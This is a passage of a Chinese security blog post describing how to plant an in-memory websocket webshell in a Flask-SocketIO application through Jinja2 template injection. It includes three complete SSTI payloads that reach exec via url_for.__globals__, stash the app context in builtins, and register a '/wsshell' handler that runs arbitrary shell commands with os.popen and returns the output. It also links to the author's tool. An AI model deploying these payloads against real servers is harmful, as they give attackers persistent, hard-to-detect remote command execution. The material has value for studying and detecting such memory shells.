![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718025029234-7d8e64f8-5e18-46e9-8544-edc1081bc686.png#averageHue=%23292b30&clientId=u82fbda9c-3c32-4&from=paste&height=219&id=u35b70e3f&originHeight=274&originWidth=929&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46912&status=done&style=none&taskId=u59daafb6-3a86-4f7e-ba47-04ad2802764&title=&width=743.2)
如果想要调用就得拿到这个对象，并不能通过单纯`import`调用，这个对象在这里：
```python
url_for.__globals__.current_app.extensions['socketio']
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718025196615-691d47ed-8bf4-4118-a1f6-3dcd0b87a01a.png#averageHue=%23eceff3&clientId=u82fbda9c-3c32-4&from=paste&height=401&id=u50cc07a8&originHeight=501&originWidth=1884&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=134699&status=done&style=none&taskId=u32b070b1-7814-45ae-a511-87c748d9111&title=&width=1507.2)
那么构造这样的 Payload
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
app.extensions['socketio'].server.handlers['/wsshell'] = {'shell': lambda e,d: app.extensions['socketio'].send(__import__('os').popen(d['cmd']).read())}
", 
{'app':url_for.__globals__['current_app']})
}}
```
注入成功，但是在连接的时候会报错显示不在上下文中，这里执行的`handler`函数就是 Payload 中的匿名函数。
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718025419589-6301e8a7-c7f0-48fa-be99-59498693097e.png#averageHue=%23212227&clientId=u82fbda9c-3c32-4&from=paste&height=686&id=ub2003030&originHeight=857&originWidth=1381&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147101&status=done&style=none&taskId=u04998476-1b9e-4e21-ad7e-75a9b2d2fae&title=&width=1104.8)
调用的地方是在`socketio.server.Server._trigger_event()`中，这里的全局变量里是没有 Flask 上下文的，但是我们又需要通过 flask 上下文的代理对象`current_app`来获取到`flask_socketio.SocketIO`来发送消息。
![](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718012411583-b098cc45-83da-41a7-a71f-c4a20a9b3bc5.png?x-oss-process=image%2Fformat%2Cwebp#averageHue=%23242830&from=url&id=jUG2b&originHeight=524&originWidth=1414&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)
那么正常的请求是怎么实现的呢，在上面的**ws连接过程中**也提到了，正常的请求在这一步并不是直接调用事件处理函数，而是先获取了 Flask 应用的上下文才去真正的调用事件处理函数。
> 但是需要注意的是这里并不是直接调用函数，在`@socketio.on`装饰器装饰事件处理函数的时候使用了Python functools包中的`@wraps(handler)`来对事件处理函数再次进行了装饰，这个也就是在上面调用`handler()`函数的时候调用的是下图中的`_handler()`

这时候笔者已经下断点绕懵逼了。最后实现的时候先调用了`_handle_event()`（由`@wraps(handler)`装饰器函数调用的），然后传入另一个匿名函数作为事件处理函数。后面才想起来应该直接调用`send`即可。这里先不管，目前我们虽然执行了命令，但是需要拿到回显，回显需要服务器发送消息，发送消息需要拿到`flask_socketio.SocketIO`对象，但是现在上下文中没有这个对象。这里要区别一下 SSTI 的时候能拿到和这里不能拿到的原因：SSTI漏洞利用的时候就在 flask 的上下文环境中，这里调用事件处理函数的时候不在，笔者想的是 flask-socketio 在本机的环境里使用了 Eventlet  来做异步服务，所以问了下GPT。
> _ 在使用 Eventlet 时访问不到 Flask 上下文通常是因为 Flask 的上下文管理机制与协程（coroutines）和绿色线程（green threads）的协作方式不兼容。Flask 依赖于上下文局部（context locals）来跟踪请求和应用程序上下文，而这些上下文局部在使用协程时可能不会被正确传递和管理。这是因为上下文局部是线程局部的（thread-local），而协程和绿色线程与传统线程的工作机制不同。  _
> ![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718026698464-463b97d3-1339-4234-aa16-e9483707e312.png#averageHue=%23849796&clientId=u82fbda9c-3c32-4&from=paste&height=112&id=u7480de58&originHeight=140&originWidth=385&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12443&status=done&style=none&taskId=u426c022c-694b-497d-b938-1e57088cf0c&title=&width=308)

不明所以，所以暴力解决，在 SSTI 漏洞利用的时候拿到 flask 的应用上下文放到 Python 的内建模块中，这样无论在哪个地方都能够拿到需要的对象了。
实现如下，在调用事件处理函数的时候直接拿到内建模块中上下文，然后执行发送消息：
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
__import__('builtins').app_ctx= app.app_context();
app.extensions['socketio'].server.handlers['/wsshell'] = {'shell':lambda s,d: __import__('builtins').app_ctx.app.extensions['socketio'].send({'msg': '<pre>{0}</pre>'.format(__import__('os').popen(d['cmd']).read())},namespace='/wsshell')}
", 
{'app':url_for.__globals__['current_app'] })
}}
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/33593053/1718026946677-efec3eb0-5f4b-483f-9d8b-f90021e76b2e.png#averageHue=%23ace1d2&clientId=u82fbda9c-3c32-4&from=paste&height=741&id=u3d2cdd60&originHeight=926&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=129948&status=done&style=none&taskId=u16b49491-8a14-45c5-8ae4-9322b224712&title=&width=1536)

PS：_其实这块能写那么多，纯纯当时拿不到对象一直调试有点懵逼了，后面拿到对象后没有直接调用_`_send_`_（忘记了），而是拿着这个对象按照正常的流程走了一遍。得到下面的Payload_
```python
{{ url_for.__globals__['__builtins__']['exec'](
"
my_func= lambda d: __import__('builtins').app_ctx.app.extensions['socketio'].send({'msg':__import__('os').popen(d['cmd']).read()},namespace='/wsshell');
__import__('builtins').app_ctx= app.app_context();
app.extensions['socketio'].server.handlers['/wsshell'] = {};
app.extensions['socketio'].server.handlers['/wsshell']['shell']= lambda s,d: __import__('flask_socketio').SocketIO._handle_event(__import__('builtins').app_ctx.app.extensions['socketio'], my_func, 'shell', '/wsshell', s, d )
", 
{'app':url_for.__globals__['current_app'] })
}}
```


用到的demo以及开发的工具：
[https://github.com/orzchen/PyMemShell/](https://github.com/orzchen/PyMemShell/)
